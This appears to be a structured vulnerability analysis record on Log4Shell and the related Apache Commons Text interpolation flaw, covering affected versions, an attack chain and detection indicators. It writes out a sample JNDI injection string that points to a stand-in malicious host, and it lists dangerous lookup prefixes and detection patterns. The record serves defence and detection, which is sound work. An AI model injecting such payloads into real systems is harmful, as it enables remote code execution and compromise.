package_info.why_malicious: The affected versions of Log4j contain a critical vulnerability (Log4Shell) that allows attackers to trigger remote code execution by injecting specially crafted strings into log messages. These strings are interpreted and executed via JNDI lookups, enabling attackers to load and execute arbitrary code from remote servers. This makes the package, as shipped in these versions, highly dangerous and a significant threat to system integrity.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by Log4j
execution_context.file_location: Any Java file or application component that uses Log4j logging methods (e.g., log.info(), log.error())
required_permissions: network access (to perform outbound JNDI lookups)
permission to load and execute remote code

malicious_snippets.code_behavior: At runtime, when a log message containing the string '${jndi:ldap://malicious.com/malwarepayload}' is processed, Log4j interprets the JNDI pattern, initiates an outbound LDAP request to the specified remote server, retrieves a serialized Java object or class file, and loads or executes the remote code, resulting in arbitrary code execution on the vulnerable server.

malice_analysis.why_suspicious: This behavior allows untrusted user input to trigger outbound network requests and load or execute code from attacker-controlled servers, which is a classic remote code execution vector and a severe security risk.
malice_analysis.violated_expectations: Logging libraries are expected to treat log messages as inert data and never interpret or execute code based on log content, especially not by performing network lookups or loading remote code.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate in enterprise Java for resource discovery or configuration, but should never be triggered by untrusted log message content.
key_indicators: Presence of '${jndi:' patterns in log messages or application input
Automatic outbound LDAP, RMI, or other JNDI-related network requests initiated by log processing
Loading or execution of Java classes or serialized objects from remote servers as a result of log message content

execution_context.trigger: At runtime, when variable interpolation is performed on user-controlled input by Apache Commons Text
execution_context.file_location: Any Java file or application component using Apache Commons Text's StringSubstitutor or similar interpolation features
required_permissions: permission to execute code via dangerous lookup mechanisms

malicious_snippets.code_language: java (string processed by Apache Commons Text)
malicious_snippets.code_behavior: At runtime, when a string containing '${prefix:name}' is interpolated by Apache Commons Text, the library resolves the prefix and may perform a remote lookup or execute code if the prefix is mapped to a dangerous lookup (such as jndi, script, url, or dns), resulting in potential remote code execution or data exfiltration.

malice_analysis.why_suspicious: Allowing arbitrary prefixes in variable interpolation enables attackers to craft input that triggers network requests or code execution, especially if dangerous lookups like jndi, script, or url are enabled.
malice_analysis.violated_expectations: Variable interpolation should only resolve safe, local variables and must not allow untrusted input to trigger network access or code execution.
malice_analysis.similar_legitimate_use: Variable interpolation is commonly used for configuration or templating, but should be restricted to safe, predefined variables and not allow dynamic, user-controlled lookups.
key_indicators: Unrestricted variable interpolation with user-controlled prefixes in input strings
Support for dangerous lookups (jndi, url, script, dns) in variable resolution
Application of StringSubstitutor or similar interpolation functions to untrusted input

attack_chain.action: Attacker injects a specially crafted string (such as '${jndi:ldap://malicious.com/malwarepayload}' or '${prefix:name}') into any input field or data source that will be logged or interpolated by the vulnerable library.
attack_chain.leads_to: Triggering of remote lookup or code execution by the vulnerable library

attack_chain.action: The vulnerable library (Log4j or Apache Commons Text) processes the malicious string, performs a JNDI or other remote lookup, and retrieves code or data from the attacker's server.
attack_chain.leads_to: Remote code execution or data exfiltration on the vulnerable system

attack_chain.action: Attacker gains arbitrary code execution, allowing them to take full control of the affected system, deploy additional malware, or move laterally within the network.
attack_chain.leads_to: System compromise and potential lateral movement

behavioral_signatures: Log messages or interpolated strings containing '${jndi:' or similar variable interpolation patterns in application logs
Unexpected outbound LDAP, RMI, DNS, or other JNDI-related network requests originating from application servers
Execution or loading of Java classes or serialized objects from remote servers triggered by log or configuration input
file_indicators: Presence of vulnerable Log4j versions (2.0-beta9 through 2.14.1) in dependency manifests such as pom.xml, build.gradle, or other build files
Use of Apache Commons Text versions prior to 1.10.0 in dependency manifests
Application or log files containing suspicious interpolation patterns like '${jndi:' or '${prefix:'
network_indicators: Outbound LDAP, RMI, or DNS requests to untrusted or unexpected domains (e.g., malicious.com, webhook.site, or attacker-controlled infrastructure)
Connections from application servers to external IPs or domains not present in normal business operations, especially during log processing
detection_knowledge.how_to_detect: Monitor application logs and network traffic for suspicious variable interpolation patterns such as '${jndi:' or '${prefix:'. Audit dependency manifests for the presence of vulnerable Log4j (2.0-beta9 through 2.14.1) and Apache Commons Text (prior to 1.10.0) versions. Set alerts for unexpected outbound LDAP, RMI, or DNS requests from application servers, particularly those correlated with log or configuration input processing. Use static analysis to identify code paths where untrusted input is passed to logging or interpolation functions, and flag any use of dangerous lookup mechanisms in variable resolution.
